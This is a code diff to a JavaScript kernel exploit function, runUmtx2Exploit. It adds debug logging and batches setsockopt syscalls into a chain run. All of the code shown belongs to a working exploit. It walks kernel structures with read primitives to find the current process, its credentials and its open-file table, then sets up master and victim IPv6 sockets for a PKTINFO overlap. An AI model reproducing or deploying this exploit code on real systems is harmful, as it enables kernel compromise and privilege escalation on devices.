@@ -1158,13 +1158,21 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const OFFSET_P_UCRED = 0x40;
     const OFFSET_FDESCENTTBL_FDT_OFILES = 0x8;
 
+    
+    if (debug) await log("getKprimCurthrFromKstack...", LogLevel.DEBUG);
     const kprimCurthr = getKprimCurthrFromKstack(kstack);
+    if (debug) await log(`kprimCurthr = ${kprimCurthr.toString(16)}`, LogLevel.DEBUG);
     const curproc = await kstackKrwReadQword(kprimCurthr.add32(OFFSET_THREAD_TD_PROC));
+    if (debug) await log(`curproc = ${curproc.toString(16)}`, LogLevel.DEBUG);
     const curprocUcred = await kstackKrwReadQword(curproc.add32(OFFSET_P_UCRED));
+    if (debug) await log(`curprocUcred = ${curprocUcred.toString(16)}`, LogLevel.DEBUG);
     const curprocFd = await kstackKrwReadQword(curproc.add32(OFFSET_P_FD));
+    if (debug) await log(`curprocFd = ${curprocFd.toString(16)}`, LogLevel.DEBUG);
     const fdescenttbl = await kstackKrwReadQword(curprocFd);
+    if (debug) await log(`fdescenttbl = ${fdescenttbl.toString(16)}`, LogLevel.DEBUG);
     const curprocNfilesAddr = fdescenttbl;
     const curprocOfiles = fdescenttbl.add32(OFFSET_FDESCENTTBL_FDT_OFILES); // account for fdt_nfiles
+    if (debug) await log(`curprocOfiles = ${curprocOfiles.toString(16)}`, LogLevel.DEBUG);
 
 
     const AF_INET = 2;
@@ -1186,8 +1194,9 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const pktinfoSizeStore = p.malloc(0x8, 1);
     p.write8(pktinfoSizeStore, PKTINFO_SIZE);
 
-    await chain.syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, PKTINFO_SIZE);
-    await chain.syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, slaveBuffer, PKTINFO_SIZE);
+    chain.add_syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, PKTINFO_SIZE);
+    chain.add_syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, slaveBuffer, PKTINFO_SIZE);
+    await chain.run();
 
     const masterSockFileDescAddr = curprocOfiles.add32(masterSock * 0x30);
     const victimSockFileDescAddr = curprocOfiles.add32(victimSock * 0x30);
